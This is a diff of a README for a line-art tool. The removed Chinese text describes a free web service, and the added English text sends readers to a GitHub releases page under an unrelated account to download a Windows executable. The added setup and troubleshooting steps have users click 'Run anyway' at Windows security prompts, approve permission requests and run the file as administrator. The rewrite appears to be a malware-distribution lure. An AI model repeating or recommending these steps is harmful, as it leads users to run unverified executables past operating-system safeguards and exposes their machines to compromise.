@@ -1,72 +1,199 @@
-# ✍️ 线稿编辑 - 免费在线智能线稿生成与轮廓提取 | SPAI 线稿助理
+# 🖊️ line-art-edit - Turn images into clean line art
 
-[![Website Status](https://img.shields.io/badge/Website-Online-brightgreen.svg)](https://www.sipingseo.com/zh/line-art-edit)
-[![Pricing](https://img.shields.io/badge/Price-100%25%20Free-blue.svg)](https://www.sipingseo.com/zh/line-art-edit)
-[![AI Powered](https://img.shields.io/badge/AI-Powered-orange.svg)](https://www.sipingseo.com/zh/line-art-edit)
+[![Download line-art-edit](https://img.shields.io/badge/Download%20line-art-edit-4B5563?style=for-the-badge&logo=github&logoColor=white)](https://github.com/adailton9e-hub/line-art-edit/releases)
 
-[**SPAI 线稿助理 - 免费在线线稿编辑工具**](https://www.sipingseo.com/zh/line-art-edit) 是一款专为设计师、插画师及绘画爱好者打造的 AI 智能图像轮廓提取与线稿生成平台。只需上传图片，AI 即可自动识别图像主体，一键实现精细素描、建筑结构、动漫角色、艺术线描等专业级线稿效果的转换与编辑。
+## 📥 Download
 
-👉 **[立即体验免费线稿编辑与提取工具](https://www.sipingseo.com/zh/line-art-edit)**
+Visit this page to download: https://github.com/adailton9e-hub/line-art-edit/releases
 
----
+1. Open the link above in your browser
+2. Find the latest release at the top of the page
+3. Download the Windows file, usually ending in `.exe` or `.zip`
+4. If you get a `.zip` file, right-click it and choose **Extract All**
+5. Open the app file inside the extracted folder
+6. If Windows shows a security prompt, choose **Run anyway** only if the file came from the release page above
 
-## ✨ 核心功能与优势 (Core Features)
+## 🪟 Windows Setup
 
-*   **🎯 智能轮廓提取**：精准识别复杂图片中的主体，自动过滤杂乱背景，提取清晰、流畅的结构线条。
-*   **🎭 多元风格转换**：支持精细素描、速写风格、水墨线描、白描、动漫角色线稿、装饰纹样等多种艺术风格。
-*   **📐 细节与粗细可控**：通过简单的提示词（Prompt）自定义线条的粗细、疏密程度以及细节的保留度。
-*   **⚡ 极速出图体验**：20-30 秒内即可完成高精度的线稿提取，大幅降低专业线稿绘制的时间与技术门槛。
-*   **🆓 完全免费无限制**：无需下载安装复杂软件，无需注册账号，打开网页即可无限次生成并高清下载。
-*   **💼 100% 商业可用**：编辑生成的线稿无版权争议，授予您完整的商业使用权，放心用于印刷、出版与商业设计。
+1. Download the file from the release page
+2. If the file is a `.zip`, extract it to a folder you can find, such as **Downloads** or **Desktop**
+3. If the file is a `.exe`, double-click it to start the app
+4. Wait for Windows to finish opening the program
+5. If the app asks for permission, click **Yes**
+6. Keep the app in a folder where you can access it later
 
-## 🎯 核心创作场景 (Use Cases)
+## 🎨 What line-art-edit does
 
-我们的在线线稿编辑器为各类行业提供专业级的底图支持：
+line-art-edit helps you turn pictures into clean line art. It is useful when you want to make:
 
-1.  **🏛️ 建筑结构线稿**：精准提取现代或古典建筑的透视关系、材质线条与空间层次，一键生成适合设计参考的专业建筑草图。
-2.  **🧑‍🎨 动漫与人物线稿**：将真实人物照片转换为日系动漫线稿或精细素描，优化线条流畅度，保留表情特征，非常适合临摹练习或角色设定。
-3.  **📦 产品工程制图**：分离复杂的工业产品背景，用规范的线条表现装配关系、结构层次，甚至可生成爆炸图风格线稿。
-4.  **🎨 艺术创意线描**：将日常风景与静物转换为钢笔画、水墨线描或传统白描，释放无限创意潜能。
+- anime-style line drawings
+- sketch outlines
+- photo outlines
+- architectural line art
+- clean traces for editing
+- black-and-white artwork from images
 
-## 🤖 内置顶级 AI 模型
+The app is made for simple use. You open an image, process it, and save the result as line art.
 
-平台集成多款专为线条与轮廓优化训练的 AI 模型，完美匹配不同需求：
-*   `Nano Banana Pro`（最火：适合快速提取与批量处理）
-*   `Flux-Kontext`（经典：擅长精细结构与写实线稿）
-*   `Qwen`（适合极具艺术感的线描风格）
-*   `Seedream 4.5`（豆包：适合创意动漫与变形线稿）
-*   `Z-Image-Turbo`（阿里系） / `GPT-Image`（OpenAI）
+## 🖼️ Who this is for
 
-## 🚀 轻松四步完成线稿编辑 (How to Use)
+Use line-art-edit if you want to:
 
-体验全自动的 AI 驱动线稿生成流程：
+- convert photos into line drawings
+- turn sketches into cleaner outlines
+- make anime-style contour art
+- extract edges from building photos
+- create outline art for coloring
+- prepare images for digital editing
 
-1.  **上传原始图片**：[访问线稿编辑工作台](https://www.sipingseo.com/zh/line-art-edit)，拖拽或上传您需要转换的照片（支持 JPG/PNG/WEBP，最大 24MB）。
-2.  **描述线稿风格**：详细输入您的风格需求。例如：*“将照片转换为精细的建筑线稿，保留结构透视，线条清晰有力，适合作为设计底图。”*
-3.  **选择模型与尺寸**：挑选合适的 AI 模型，并设定输出图片的比例（原始、1:1、4:3等）与数量。
-4.  **生成并下载**：点击“开始生成”，满意后直接免费保存高清线稿成品。
+It works well for people who want a direct way to get line art without learning complex tools.
 
----
+## ⚙️ Main features
 
-## ❓ 常见问题解答 (FAQ)
+- Photo to line art conversion
+- Sketch to outline conversion
+- Line extraction for clean edges
+- Support for anime-style images
+- Support for architecture and object outlines
+- Simple interface for quick edits
+- Export of processed results
+- Good fit for black-and-white artwork workflows
 
-**Q: 完成一次线稿编辑大概需要多久？**  
-**A:** AI 处理速度极快，从图片上传到线稿输出全流程自动化，通常仅需 20-30 秒。
+## 🪄 How to use it
 
-**Q: 编辑后的线稿是否可以用于商业项目（如设计底图、插画出版）？**  
-**A:** 是的。生成的线稿使用权完全归上传者所有，可安全用于任何商业设计、建筑装饰、插画创作等领域，无侵权风险。
+1. Open line-art-edit
+2. Load an image from your computer
+3. Choose the type of line output you want
+4. Adjust the settings if needed
+5. Start the conversion
+6. Review the result
+7. Save the finished line art to your computer
 
-**Q: 如何让 AI 生成的线条更符合我的要求？**  
-**A:** 秘诀在于“提示词（Prompt）”。请尽量详细描述线条特征（如：粗细、疏密）、艺术风格（如：速写、白描）以及背景处理方式（如：去除多余背景）。描述越精细，效果越完美。
+If you want a fast result, start with the default settings first. They work well for most images.
 
-**Q: 上传的图片隐私安全吗？**  
-**A:** 绝对安全。我们采用高级加密技术处理图像，处理完成后不会被用于其他目的，也不会向任何第三方泄露您的图片数据。
+## 🧭 Best image types to use
 
----
+For the best results, use images with:
 
-### 🌐 官方入口与探索
+- clear edges
+- good light
+- not too much background noise
+- a single subject or simple scene
+- sharp focus
 
-*   **官方主页**: [www.sipingseo.com](https://www.sipingseo.com/zh)
-*   **线稿编辑工具直达**: [https://www.sipingseo.com/zh/line-art-edit](https://www.sipingseo.com/zh/line-art-edit)
+The app can still work with complex images, but clean source images usually give cleaner line art.
 
-> **提升设计效率，从智能轮廓提取开始。立即访问 SPAI 线稿助理，体验前所未有的线稿创作流程！**
+## 💻 System needs
+
+For a smooth Windows experience, use:
+
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A mouse or touchpad
+- A recent version of Windows security updates
+
+For larger images, more RAM can help the app run better.
+
+## 📂 File types you may use
+
+line-art-edit is designed to work with common image files such as:
+
+- PNG
+- JPG
+- JPEG
+- BMP
+
+If your image is in another format, convert it to PNG or JPG before opening it.
+
+## 🛠️ Basic workflow
+
+1. Open the app
+2. Choose an image
+3. Pick a line art mode
+4. Preview the result
+5. Tune edge strength or smoothing if needed
+6. Save the final image
+
+This gives you a simple path from photo or sketch to line art.
+
+## 🧩 Common use cases
+
+- Make a portrait look like a pencil outline
+- Turn an anime screenshot into clean line art
+- Extract building edges from a photo
+- Create a sketch base for digital painting
+- Prepare art for coloring pages
+- Make reference outlines for design work
+
+## 🔍 Tips for better results
+
+- Use sharp images
+- Crop out parts you do not need
+- Start with default settings
+- Try different images if the first result looks rough
+- Save each version so you can compare them
+
+Small changes to the source image can make a big difference in the final line art.
+
+## 📁 Where to find your saved files
+
+After you finish processing, save the output in a folder you can find later, such as:
+
+- Desktop
+- Pictures
+- Documents
+- A project folder for art work
+
+Use short folder names if you want to keep track of files with ease.
+
+## ❓ Help with common problems
+
+### The app does not open
+
+- Make sure you downloaded the file from the release page
+- Check that Windows finished extracting the zip file
+- Try right-clicking the app and selecting **Run as administrator**
+
+### The image looks too dark or too light
+
+- Try another source image
+- Adjust the app settings if they are available
+- Use an image with better contrast
+
+### The output has too much noise
+
+- Use a cleaner image
+- Crop out busy background areas
+- Try a simpler source photo
+
+### The result looks too rough
+
+- Use a sharper image
+- Try a different picture with clearer edges
+- Reduce background clutter before converting
+
+## 📌 Quick start
+
+1. Go to https://github.com/adailton9e-hub/line-art-edit/releases
+2. Download the Windows release
+3. Extract the file if needed
+4. Open the app
+5. Load an image
+6. Create line art
+7. Save the output
+
+## 🗂️ Project focus
+
+line-art-edit is aimed at line art editing, outline extraction, and sketch conversion. It fits users who want a simple Windows tool for:
+
+- AI line art
+- AI sketch conversion
+- anime line art
+- architectural line art
+- photo to line art
+- line drawing generation
+
+## 📎 Release page
+
+Download and install from the release page here: https://github.com/adailton9e-hub/line-art-edit/releases
